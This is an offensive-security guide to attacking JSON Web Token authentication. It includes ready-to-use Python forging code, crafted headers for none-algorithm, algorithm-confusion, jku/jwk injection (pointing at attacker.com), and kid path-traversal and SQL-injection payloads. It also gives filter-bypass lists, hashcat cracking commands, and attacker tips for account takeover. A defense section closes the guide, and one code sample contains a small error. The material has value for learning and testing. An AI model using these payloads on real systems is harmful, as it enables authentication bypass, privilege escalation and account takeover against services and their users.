# JWT Attacks

## Table of Contents

1. [What Are JWTs?](#1-what-are-jwts)
2. [How JWTs Work (Foundation)](#2-how-jwts-work-foundation)
3. [Where JWTs Occur — Attack Surface](#3-where-jwts-occur--attack-surface)
4. [Detection — Identifying JWT Usage](#4-detection--identifying-jwt-usage)
5. [Attack Techniques](#5-attack-techniques)
   - 5.1 [Signature Not Verified](#51-signature-not-verified)
   - 5.2 [None Algorithm Attack](#52-none-algorithm-attack)
   - 5.3 [Algorithm Confusion Attack (RS256 → HS256)](#53-algorithm-confusion-attack-rs256--hs256)
   - 5.4 [JKU Header Injection](#54-jku-header-injection)
   - 5.5 [JWK Header Injection](#55-jwk-header-injection)
   - 5.6 [KID Header Injection — Path Traversal](#56-kid-header-injection--path-traversal)
   - 5.7 [KID Header Injection — SQL Injection](#57-kid-header-injection--sql-injection)
   - 5.8 [Weak Secret Brute Force](#58-weak-secret-brute-force)
   - 5.9 [JWT Information Disclosure](#59-jwt-information-disclosure)
   - 5.10 [Expiration & Replay Attacks](#510-expiration--replay-attacks)
6. [Bypassing JWT Defenses](#6-bypassing-jwt-defenses)
7. [Impact Assessment](#7-impact-assessment)
8. [Defense & Prevention](#8-defense--prevention)
9. [Quick Reference Cheat Sheet](#9-quick-reference-cheat-sheet)

---

## 1. What Are JWTs?

JSON Web Tokens (JWTs) are a standardized, self-contained format (RFC 7519) for transmitting JSON data between parties as a cryptographically signed object. Because they are self-contained — the token itself carries all claims about the user — they are widely used to replace traditional server-side sessions.

### Primary Uses

- **Authentication** — prove who you are after login
- **Session management** — replace server-side session storage with a signed client-side token
- **Access control** — carry role and permission claims the server uses for authorization decisions

### Why JWT Vulnerabilities Are Critical

JWT vulnerabilities exist at the intersection of cryptography and application logic. A single flaw in how a JWT is validated can give an attacker complete control over who they appear to be — bypassing authentication and authorization simultaneously, with no need for credentials.

---

## 2. How JWTs Work (Foundation)

### Structure

A JWT is three Base64URL-encoded sections joined by dots:

```
HEADER.PAYLOAD.SIGNATURE
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Header** — algorithm and token type:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** — claims about the user (not encrypted — anyone can read this):
```json
{
  "sub": "user123",
  "role": "user",
  "iss": "https://target.com",
  "exp": 1893456000,
  "iat": 1609459200
}
```

**Signature** — cryptographic proof of integrity:
```
HMAC-SHA256(
  base64url(header) + "." + base64url(payload),
  secret_key
)
```

### Token Verification Flow

```
Client sends JWT
        │
        ▼
Server decodes header → reads "alg" field
        │
        ▼
Server retrieves signing key (from config, database, or URL in header)
        │
        ▼
Server recomputes signature using key + algorithm
        │
        ▼
Server compares recomputed signature with token's signature
        │
  ┌─────┴──────┐
  Match        No match
  │            │
  ▼            ▼
Trust claims  Reject token
```

### Common JWT Claims

| Claim | Meaning | Attacker Focus |
|-------|---------|----------------|
| `sub` | Subject — user identifier | Change to another username or user ID |
| `role` | User role | Change `user` → `admin` |
| `iss` | Issuer | Forge to bypass issuer validation |
| `exp` | Expiration timestamp | Remove or set far in future |
| `iat` | Issued at timestamp | Informational |
| `nbf` | Not before | Remove to use token before intended validity |
| `kid` | Key identifier | Inject path traversal or SQL |
| `jku` | JWK Set URL | Point to attacker-controlled key server |
| `jwk` | Embedded public key | Embed attacker's own public key |

### The Critical Weakness

The **payload is only Base64URL-encoded, not encrypted.** Any party in possession of the token can decode and read its contents. The signature only proves the token was not tampered with — it does not hide the data. All JWT attacks exploit flaws in how the signature is generated or verified.

---

## 3. Where JWTs Occur — Attack Surface

| Location | Format | Notes |
|----------|--------|-------|
| Cookie | `session=eyJ...` | Check both HttpOnly and non-HttpOnly cookies |
| Authorization header | `Authorization: Bearer eyJ...` | Standard API authentication |
| Request body | `{"token": "eyJ..."}` | Less common; seen in custom auth flows |
| Query parameter | `?token=eyJ...` | Insecure; token logged in server access logs |
| Response body | Returned on login, stored client-side | Inspect login/refresh endpoints |
| LocalStorage | Stored by JavaScript | Accessible via XSS — no HttpOnly protection |

---

## 4. Detection — Identifying JWT Usage

### Visual Recognition

JWTs always start with `eyJ` — this is the Base64URL encoding of `{"` which begins every JSON header.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIn0.signature
└─── header ───────────────────────────┘└─── payload ──────────┘└─ sig ──┘
```

**Quick decode:**
```bash
# Decode header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# Decode payload
echo "eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ" | base64 -d
# {"sub":"user123","role":"user"}
```

### What to Look For on First Inspection

```
1. What algorithm is used? (alg field in header)
   HS256 / HS384 / HS512 → HMAC — single shared secret
   RS256 / RS384 / RS512 → RSA — asymmetric key pair
   ES256 / ES384 / ES512 → ECDSA — asymmetric key pair
   none                  → no signature — immediate red flag

2. What sensitive claims exist in the payload?
   sub, user_id, role, email, isAdmin

3. What optional headers are present?
   kid, jku, jwk → each is an injection vector

4. What is the expiration?
   exp claim far in future → long-lived token → higher replay impact
   exp claim missing       → token never expires
```

---

## 5. Attack Techniques

### 5.1 Signature Not Verified

**Situation:** The application deserializes and uses JWT claims without verifying the signature at all. This is a complete implementation failure — the signature field exists but is never checked.

**Detection:**
```
1. Decode the JWT
2. Modify a claim in the payload (e.g. role: user → role: admin)
3. Re-encode the header and payload (keep original signature or use any garbage)
4. Submit the token
5. If the modification is accepted → signature is never verified
```

**Payload modification:**
```json
Original:  {"sub": "user123", "role": "user"}
Modified:  {"sub": "administrator", "role": "admin"}
```

**Reconstructed token (signature unchanged or arbitrary):**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluIn0.
[original_or_garbage_signature]
```

**Why it works:** The server never calls the signature verification function. It simply decodes the payload and trusts the claims. The signature is decorative.

> **Attacker note:** This is the first thing to test — before any complex attack. Simply modify the `sub` claim to another username (try `administrator`, `admin`, `root`) and resubmit. If the server accepts it, you have immediate account takeover without any cryptographic work. Custom JWT implementations are far more likely to miss this than established libraries.

---

### 5.2 None Algorithm Attack

**Situation:** The JWT library accepts `"alg": "none"` — a legitimate part of the JWT specification that removes the signature requirement entirely for unsecured tokens. Misconfigured libraries treat this as a valid algorithm and skip signature verification.

**Original token header:**
```json
{"alg": "HS256", "typ": "JWT"}
```

**Modified header:**
```json
{"alg": "none", "typ": "JWT"}
```

**Construction:**
```bash
# Encode new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Encode modified payload
echo -n '{"sub":"administrator","role":"admin"}' | base64 | tr '+/' '-_' | tr -d '='
# eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluIn0

# Final token — note the trailing dot with NO signature
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluIn0.
```

**The signature section must be empty but the trailing dot must remain:**
```
header.payload.     ← trailing dot with nothing after it
```

**Algorithm variations to try:**
```
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

**Why it works:** The JWT spec includes `none` as a valid algorithm for contexts where integrity is protected by other means. Vulnerable libraries implement it without restricting it to safe contexts — they see `alg: none`, skip signature verification, and accept any payload.

> **Attacker note:** Always try case variations. Many libraries use case-insensitive comparison for the algorithm name but only explicitly blacklist the lowercase `"none"`. `"None"` or `"NONE"` often bypasses the blacklist while still triggering the no-signature code path.

---

### 5.3 Algorithm Confusion Attack (RS256 → HS256)

**Situation:** The server uses asymmetric RS256 (RSA) — a private key signs tokens, the public key verifies them. An attacker changes the algorithm to HS256 (HMAC) and signs the token using the server's **public key** as the HMAC secret. If the library does not validate that the algorithm matches what the server expects, it will verify the HMAC signature using the public key — which the attacker already knows.

**The confusion:**
```
RS256 (expected):
  Sign:   private key  (server only)
  Verify: public key   (known to everyone)

HS256 (injected):
  Sign:   shared secret
  Verify: same shared secret

If the library uses the public key as the HS256 "secret" for verification
AND the attacker knows the public key
→ Attacker can sign any token the server will accept
```

**Attack flow:**

**Step 1 — Obtain the server's public key:**
```bash
# Common locations
curl https://target.com/jwks.json
curl https://target.com/.well-known/jwks.json
curl https://target.com/.well-known/openid-configuration  # points to jwks_uri

# Also: extract from a valid JWT signature (RS256 allows public key recovery)
```

**Step 2 — Convert JWK to PEM format:**
```python
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
import base64, struct

# Parse the JWK n and e values
# Convert to RSA public key object
# Export as PEM
```

**Step 3 — Modify the JWT header and payload:**
```json
Header:  {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "administrator", "role": "admin"}
```

**Step 4 — Sign using the public key as HMAC secret:**
```python
import jwt, base64

public_key_pem = open('public_key.pem', 'rb').read()

forged_token = jwt.encode(
    {"sub": "administrator", "role": "admin"},
    public_key_pem,   # public key used as HMAC secret
    algorithm="HS256"
)
```

**Step 5 — Submit and observe:**
```
Server receives token with alg: HS256
Server retrieves its public key (because it's stored as the "verification key")
Server computes HMAC-SHA256(header.payload, public_key)
Server compares with token's signature
Signature matches (attacker signed with the same public key)
→ Token accepted as valid
```

**Why it works:** The library is told `alg: HS256` by the token itself and uses the configured key material (the public key) as the HMAC secret without checking whether the algorithm matches what was configured. The algorithm choice is trusted from the attacker-controlled header.

> **Attacker note:** The public key must be obtained in exactly the format the server uses it. If the server stores it as a PEM string including newlines and headers (`-----BEGIN PUBLIC KEY-----`), use that exact byte sequence as the HMAC secret. Minor formatting differences will produce a different HMAC and the attack will fail silently — vary the key format if the first attempt is rejected.

---

### 5.4 JKU Header Injection

**Situation:** The `jku` (JWK Set URL) header parameter tells the server where to fetch the signing key. If the server fetches from this URL without validating it against a whitelist, the attacker can host their own key set and sign tokens with a key the server will trust.

**Original JWT header:**
```json
{"alg": "RS256", "typ": "JWT", "kid": "key1"}
```

**Injected header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json",
  "kid": "attacker-key-id"
}
```

**Attack flow:**

**Step 1 — Generate an RSA key pair:**
```bash
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub
```

**Step 2 — Host a JWKS endpoint on attacker server:**
```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key-id",
      "use": "sig",
      "alg": "RS256",
      "n": "<base64url encoded modulus>",
      "e": "AQAB"
    }
  ]
}
```

**Step 3 — Sign the forged JWT with attacker's private key:**
```python
import jwt

payload = {"sub": "administrator", "role": "admin"}
private_key = open('attacker.key', 'rb').read()

token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers={"jku": "https://attacker.com/jwks.json", "kid": "attacker-key-id"}
)
```

**Step 4 — Server verification chain:**
```
Server receives token
→ Reads jku: https://attacker.com/jwks.json
→ Fetches JWKS from attacker server
→ Finds key with matching kid: attacker-key-id
→ Verifies token signature using attacker's PUBLIC key
→ Signature valid (attacker signed with corresponding private key)
→ Token accepted
```

**Why it works:** The server trusts the `jku` URL to provide legitimate signing keys without checking whether the URL belongs to its own infrastructure. It's equivalent to trusting someone's ID card when they get to choose who issues it.

> **Attacker note:** Many servers implement partial `jku` validation — they check that the domain matches the application's domain. Try bypasses: `https://target.com.attacker.com`, `https://attacker.com/?url=https://target.com`, open redirects on target.com that redirect to attacker.com. Also test if http:// is accepted instead of https:// — some validation only checks the domain, not the scheme.

---

### 5.5 JWK Header Injection

**Situation:** The `jwk` header parameter allows embedding a public key directly in the JWT header. If the server uses this embedded key for verification instead of its configured key, the attacker can sign any token with their own private key and embed the corresponding public key in the header.

**Standard JWT header (no embedded key):**
```json
{"alg": "RS256", "typ": "JWT"}
```

**Injected JWT header (attacker's public key embedded):**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "attacker-key",
    "n": "<attacker's public key modulus base64url>"
  }
}
```

**Attack flow:**

**Step 1 — Generate RSA key pair (same as JKU attack)**

**Step 2 — Embed public key in JWT header, sign with private key:**
```python
import jwt
from cryptography.hazmat.primitives.serialization import load_pem_private_key

private_key = load_pem_private_key(open('attacker.key', 'rb').read(), password=None)
public_key = private_key.public_key()

# Extract RSA components for JWK embedding
public_numbers = public_key.public_key().public_numbers()

jwk_header = {
    "kty": "RSA",
    "e": base64url(public_numbers.e),
    "n": base64url(public_numbers.n),
    "kid": "attacker-key"
}

token = jwt.encode(
    {"sub": "administrator", "role": "admin"},
    private_key,
    algorithm="RS256",
    headers={"jwk": jwk_header}
)
```

**Step 3 — Server uses embedded key for verification:**
```
Server receives token with jwk header
→ Extracts public key from jwk field
→ Verifies signature using that key
→ Signature valid (attacker signed with matching private key)
→ Token accepted
```

**Why it works:** The server trusts the key embedded in the token header rather than using its own configured key. The attacker controls both the private key (signing) and the public key (verification material embedded in the header).

> **Attacker note:** The JWK injection and JKU injection attacks are equivalent in impact but differ in delivery. JWK is self-contained (no external request needed), while JKU requires hosting an external server. JWK injection is simpler and leaves no external traffic trace, but JKU injection is more likely to bypass server-side caching or validation checks that don't expect an embedded key. Try both.

---

### 5.6 KID Header Injection — Path Traversal

**Situation:** The `kid` (Key ID) header parameter is used to identify which key the server should use to verify the token. If the server uses the `kid` value to load a key from the filesystem (e.g., `keys/{kid}.pem`), path traversal in the `kid` can redirect the server to load a predictable file as the signing key.

**Normal `kid` usage:**
```json
{"alg": "HS256", "kid": "key-2024"}
→ Server loads: /keys/key-2024.pem
→ Verifies HMAC using contents of that file
```

**Injected `kid` with path traversal:**
```json
{"alg": "HS256", "kid": "../../../dev/null"}
→ Server loads: /dev/null
→ /dev/null has zero bytes → empty string as HMAC secret
→ Attacker signs token with empty string as secret → token accepted
```

**Construction — sign with empty string:**
```python
import jwt

payload = {"sub": "administrator", "role": "admin"}

forged_token = jwt.encode(
    payload,
    "",          # empty string — matches /dev/null content
    algorithm="HS256",
    headers={"kid": "../../../../../../../dev/null"}
)
```

**Other path traversal targets:**
```
../../../dev/null              → empty content → sign with ""
../../../etc/hostname          → predictable content → sign with hostname value
../../../proc/sys/kernel/ostype → "Linux\n" on Linux hosts
../../../tmp/known-file         → if attacker can write to /tmp via another vulnerability
```

**Why it works:** The server uses the `kid` value in a filesystem path without sanitization. Path traversal navigates outside the intended key directory. By targeting files with known or empty content, the HMAC secret becomes predictable and the attacker can compute a valid signature.

> **Attacker note:** `/dev/null` is the classic target because it contains zero bytes on every Linux system, making the HMAC secret always an empty string. If the application is Windows-based, try `NUL` (Windows equivalent). If `/dev/null` is filtered, try `/dev/tcp/host/port` or `/proc/version` — both have semi-predictable content on Linux.

---

### 5.7 KID Header Injection — SQL Injection

**Situation:** The server uses the `kid` value in a SQL query to retrieve the signing key from a database rather than the filesystem.

**Vulnerable query pattern:**
```sql
SELECT key_value FROM signing_keys WHERE kid = '[kid_from_header]'
```

**Injected `kid`:**
```json
{"alg": "HS256", "kid": "' UNION SELECT 'attacker_secret'--"}
```

**Resulting query:**
```sql
SELECT key_value FROM signing_keys WHERE kid = '' UNION SELECT 'attacker_secret'--'
→ Returns: 'attacker_secret' as the key value
```

**Sign token using the injected secret:**
```python
forged_token = jwt.encode(
    {"sub": "administrator", "role": "admin"},
    "attacker_secret",    # same string injected into SQL
    algorithm="HS256",
    headers={"kid": "' UNION SELECT 'attacker_secret'--"}
)
```

**Why it works:** The kid value is concatenated directly into a SQL query. The UNION SELECT returns the attacker's chosen string as the key. The server verifies the HMAC using that same string — which the attacker used to sign the token — and it matches.

> **Attacker note:** The injected value and the signing secret must be identical. If the SQL query returns the key as a binary type, the HMAC is computed over the raw bytes — sign using the same exact bytes. Test with a known simple secret first (e.g., `'x'`) and verify it works before moving to privilege escalation payloads.

---

### 5.8 Weak Secret Brute Force

**Situation:** The application uses HS256/HS384/HS512 with a weak, guessable HMAC secret. Because the signature algorithm is symmetric, anyone who knows the secret can forge valid tokens.

**Detection:**
```
If alg is HS256/HS384/HS512 → shared secret attack surface
Collect a valid JWT from the application
Attempt offline brute force against common secrets
```

**Brute force with hashcat:**
```bash
# hashcat mode 16500 = JWT HS256/384/512
hashcat -a 0 -m 16500 captured.jwt /usr/share/wordlists/rockyou.txt

# Common JWT secrets wordlist
hashcat -a 0 -m 16500 captured.jwt /usr/share/seclists/Passwords/scraped-JWT-secrets.txt

# Rule-based attack
hashcat -a 0 -m 16500 captured.jwt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force short secrets (4-8 chars)
hashcat -a 3 -m 16500 captured.jwt ?a?a?a?a?a?a
```

**Common weak secrets to try manually:**
```
secret
password
admin
jwt_secret
jwtsecret
your-256-bit-secret
change_me
supersecret
```

**Forge token once secret is known:**
```python
import jwt

secret = "secret"   # cracked secret

forged = jwt.encode(
    {"sub": "administrator", "role": "admin", "exp": 9999999999},
    secret,
    algorithm="HS256"
)
```

**Why it works:** HMAC-based JWT signing uses the same key for both signing and verification. If the key is a word or short string, offline dictionary attacks against a captured token are fast. Hashcat can test billions of candidates per second against HS256.

> **Attacker note:** Always attempt brute force before complex attacks when the algorithm is HS256. If the application was built by a developer who didn't read the documentation, secrets like `secret`, `password`, or the application name are common. Even a 15-character secret is crackable if it's a common phrase. The crack happens entirely offline — the server is never touched.

---

### 5.9 JWT Information Disclosure

**Situation:** The JWT payload contains sensitive data that the developer assumed was encrypted (it is not — it is only Base64-encoded).

**Decode any JWT payload:**
```bash
echo "eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJlbWFpbCI6ImFkbWluQHRhcmdldC5jb20ifQ" \
  | base64 -d
# {"sub":"user123","role":"user","email":"admin@target.com","internal_id":"EMP-4521"}
```

**What payloads commonly leak:**
```
email addresses       → username format, target for phishing
internal user IDs     → enumerate users via IDOR
roles and permissions → understand authorization model
API keys              → direct access to internal services
database record IDs   → map internal data structure
environment info      → staging vs production, server details
```

**Why it matters beyond reading:** The data in the payload often reveals the exact claim names the server uses for authorization decisions. Knowing `"role": "user"` means you know exactly what to change it to (`"admin"`) in every other JWT attack.

> **Attacker note:** Always decode the JWT payload as the very first step — before attempting any attack. It gives you the exact field names and values the application uses, saving time and preventing mistakes in subsequent attacks. The payload is public information; no exploitation is required to read it.

---

### 5.10 Expiration & Replay Attacks

**Situation:** The application uses JWTs with missing, distant, or improperly validated expiration claims, or fails to invalidate tokens after logout/password change.

**Missing expiration:**
```json
{"sub": "user123", "role": "user"}
// No "exp" claim → token never expires
// Stolen token remains valid indefinitely
```

**Expired token reuse:**
```
1. Obtain a valid JWT
2. Wait for expiration
3. Replay the expired token
→ If accepted → expiration not validated server-side
```

**Post-logout replay:**
```
1. Log in → capture JWT
2. Log out
3. Replay the captured JWT in a subsequent request
→ If accepted → stateless JWT, no server-side invalidation, logout is client-side only
```

**Post-password-change replay:**
```
1. Obtain JWT for account A
2. Change account A's password
3. Replay the old JWT
→ If accepted → compromised sessions remain valid after password change
```

**Why it matters:** JWTs are stateless by design — the server doesn't track issued tokens. This makes logout inherently difficult. If the server doesn't maintain a token denylist or rotate signing keys on logout/password change, captured JWTs remain valid for their entire lifetime regardless of user action.

> **Attacker note:** In real engagements, always test post-logout token validity. If XSS or network interception gives you a victim's JWT, knowing it remains valid after logout dramatically increases the impact window. Combine with a long expiration claim to maximize persistence.

---

## 6. Bypassing JWT Defenses

### 6.1 Algorithm Whitelist Bypass

**Defense:** Server only accepts tokens with `alg: RS256`.

**Bypass:** Change to `alg: RS256` but use algorithm confusion — sign with HS256 using the public key as the secret. The header claims RS256 but verification behaves as HS256 if the library has the confusion vulnerability.

### 6.2 JKU Domain Whitelist Bypass

**Defense:** Server validates that `jku` URL belongs to `target.com`.

**Bypass techniques:**
```
# Subdomain bypass
https://attacker.com.target.com/jwks.json
https://target.com.attacker.com/jwks.json  (if check is "contains target.com")

# Open redirect on target.com
https://target.com/redirect?url=https://attacker.com/jwks.json

# Path confusion
https://target.com@attacker.com/jwks.json

# URL fragment
https://target.com/page#https://attacker.com/jwks.json

# Parameter injection
https://target.com/?url=https://attacker.com/jwks.json
```

### 6.3 KID Path Traversal Filter Bypass

**Defense:** Server strips `../` from `kid` values.

**Bypass:**
```
....//....//....//dev/null     (nested traversal — strip once leaves ../)
..%2f..%2f..%2fdev%2fnull      (URL-encoded slash)
..%252f..%252fdev%252fnull     (double-encoded)
```

### 6.4 None Algorithm Case Bypass

**Defense:** Server explicitly rejects `alg: none`.

**Bypass:**
```
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
"alg": "NoNe"
```

---

## 7. Impact Assessment

| Attack | Authentication Bypassed | Privilege Escalated | Scope |
|--------|------------------------|---------------------|-------|
| Signature not verified | Yes | Yes | Any user → any user |
| None algorithm | Yes | Yes | Any user → any user |
| Algorithm confusion | Yes | Yes | Full token forgery |
| JKU injection | Yes | Yes | Full token forgery |
| JWK injection | Yes | Yes | Full token forgery |
| KID path traversal | Yes | Yes | Full token forgery |
| KID SQL injection | Yes | Yes | Full token forgery + SQLi |
| Weak secret | Yes | Yes | Full token forgery |
| Expiration bypass | Partial | No | Extended session lifetime |
| Information disclosure | No | Indirect | Enables other attacks |

### Severity Factors

| Factor | Lower Severity | Higher Severity |
|--------|---------------|-----------------|
| Claim modification needed | Change non-sensitive field | Change `sub`, `role`, `isAdmin` |
| Algorithm used | HS256 (shared secret) | RS256 (asymmetric — algorithm confusion possible) |
| Key material accessibility | Secret required (brute force) | Public key accessible (algorithm confusion) |
| External infrastructure | JKU requires hosting server | JWK self-contained |
| Session invalidation | Tokens invalidated on logout | Stateless — tokens persist after logout |

---

## 8. Defense & Prevention

### Core Principle

**Never trust the algorithm specified in the JWT header.** The server must enforce the expected algorithm independently of what the token claims to use.

### 1. Enforce Algorithm Explicitly Server-Side

Never read `alg` from the token header to decide how to verify. Configure the expected algorithm in server code and reject anything that doesn't match.

```python
# VULNERABLE — trusts alg from token
decoded = jwt.decode(token, key, algorithms=jwt.get_unverified_header(token)['alg'])

# SAFE — algorithm explicitly enforced
decoded = jwt.decode(token, key, algorithms=["RS256"])
```

### 2. Explicitly Reject the None Algorithm

```python
# Explicitly exclude none from accepted algorithms
ACCEPTED_ALGORITHMS = ["RS256"]  # never include "none"

decoded = jwt.decode(token, public_key, algorithms=ACCEPTED_ALGORITHMS)
```

### 3. Validate JKU and JWK Headers

```python
# SAFE — whitelist allowed JKU domains
ALLOWED_JKU_DOMAINS = {"jwks.target.com", "auth.target.com"}

def validate_jku(jku_url):
    from urllib.parse import urlparse
    domain = urlparse(jku_url).netloc
    if domain not in ALLOWED_JKU_DOMAINS:
        raise ValueError(f"Untrusted JKU domain: {domain}")

# SAFE — reject tokens with embedded JWK headers
def reject_jwk_header(token):
    header = jwt.get_unverified_header(token)
    if 'jwk' in header:
        raise ValueError("jwk header parameter not permitted")
```

### 4. Sanitize KID Before Filesystem or Database Use

```python
import re

def validate_kid(kid):
    # Allow only alphanumeric, hyphens, underscores
    if not re.match(r'^[a-zA-Z0-9_-]+$', kid):
        raise ValueError(f"Invalid kid format: {kid}")
    return kid

# For database use — always parameterized queries
cursor.execute("SELECT key_value FROM signing_keys WHERE kid = %s", (kid,))
```

### 5. Use Strong Secrets for HMAC Algorithms

```python
import secrets

# Generate a cryptographically secure secret (minimum 32 bytes for HS256)
secret = secrets.token_bytes(64)  # 512 bits — far beyond brute force feasibility

# Never use:
# secret = "secret"
# secret = "password"
# secret = app_name
```

### 6. Implement Token Invalidation

```python
# Maintain a server-side denylist for invalidated tokens
import redis

r = redis.Redis()

def invalidate_token(jti):
    # Store jti until original expiration
    r.setex(f"revoked:{jti}", token_ttl, "1")

def is_token_valid(token):
    claims = jwt.decode(token, key, algorithms=["RS256"])
    jti = claims.get('jti')
    if r.exists(f"revoked:{jti}"):
        raise ValueError("Token has been revoked")
    return claims

# Call invalidate_token(jti) on logout, password change, account compromise
```

### 7. Set Short Expiration Times

```python
from datetime import datetime, timedelta

payload = {
    "sub": user_id,
    "role": "user",
    "iat": datetime.utcnow(),
    "exp": datetime.utcnow() + timedelta(minutes=15),  # short-lived
    "jti": str(uuid.uuid4())  # unique ID for revocation
}
```

---

## 9. Quick Reference Cheat Sheet

### Signs a JWT Implementation May Be Vulnerable

- Token algorithm is `HS256` with a simple application name as secret
- JWT header contains `jku`, `jwk`, or `kid` parameters
- Modifying payload claims and resubmitting does not produce an error
- Expired tokens are still accepted
- Tokens remain valid after logout
- The JWKS endpoint (`/jwks.json`) is publicly accessible
- Stack traces mention JWT library names (enables library-specific exploit selection)
- Application returns different errors for expired vs. invalid signature (oracle)

### Attack Selection Decision Tree

```
JWT found
    │
    ▼
Decode payload → note claims, field names
    │
    ▼
Check alg in header
    ├── "none" → test none algorithm attack (5.2)
    ├── HS256  → test signature not verified (5.1)
    │           → test weak secret brute force (5.8)
    └── RS256  → test signature not verified (5.1)
                → test algorithm confusion RS256→HS256 (5.3)
                → check header for jku/jwk/kid parameters
                    ├── jku present → JKU injection (5.4)
                    ├── jwk present → JWK injection (5.5)
                    └── kid present → KID path traversal (5.6)
                                   → KID SQL injection (5.7)
    │
    ▼
Test expiration/replay regardless of algorithm (5.10)
```

### Payload Progression (Try in Order)

```
1. Decode payload → read all claims
2. Modify sub/role claim → resubmit with original signature → signature not verified?
3. Change alg to "none" → remove signature → none algorithm bypass?
4. Brute force secret (HS256) → forge with cracked secret
5. Obtain public key → algorithm confusion RS256→HS256
6. Inject jku → host malicious JWKS → JKU injection
7. Embed jwk → sign with attacker private key → JWK injection
8. Path traversal in kid → /dev/null → sign with empty string
9. SQL injection in kid → UNION SELECT known secret
10. Replay after logout → expiration/invalidation issue
```

### JWT Claim Modification Targets

| Original Claim | Change To | Goal |
|---------------|-----------|------|
| `"sub": "user123"` | `"sub": "administrator"` | Access admin account |
| `"role": "user"` | `"role": "admin"` | Privilege escalation |
| `"isAdmin": false` | `"isAdmin": true` | Admin access |
| `"exp": 1609459200` | `"exp": 9999999999` | Never-expiring token |
| `"user_id": 1001` | `"user_id": 1` | Access admin account (ID 1) |

### Algorithm Reference

| Algorithm | Type | Attack Surface |
|-----------|------|---------------|
| HS256/HS384/HS512 | Symmetric HMAC | Weak secret brute force; KID injection |
| RS256/RS384/RS512 | Asymmetric RSA | Algorithm confusion; JKU/JWK injection |
| ES256/ES384/ES512 | Asymmetric ECDSA | Algorithm confusion (less common) |
| none | No signature | Direct claim modification |

### Base64URL Encode/Decode One-Liners

```bash
# Decode JWT section
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d

# Encode modified header/payload
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='

# Full JWT decode (all three sections)
token="eyJ..."
IFS='.' read -r h p s <<< "$token"
echo "Header:  $(echo $h | base64 -d 2>/dev/null)"
echo "Payload: $(echo $p | base64 -d 2>/dev/null)"
```

### KID Path Traversal Payloads

```
../../../dev/null
../../../../dev/null
../../../../../dev/null
../../../../../../dev/null
../../../../../../../dev/null    ← filesystem root
../../../etc/hostname
../../../proc/version
../../../proc/sys/kernel/ostype
../../../tmp/known-content-file
```

### Hashcat JWT Cracking

```bash
# Capture the full JWT token (all three sections including dots)
# Store in jwt.txt

# Dictionary attack
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Combined dictionary + rules
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -r best64.rule

# Brute force up to 6 chars
hashcat -a 3 -m 16500 jwt.txt ?a?a?a?a?a?a

# Check cracked secrets
hashcat -m 16500 jwt.txt --show
```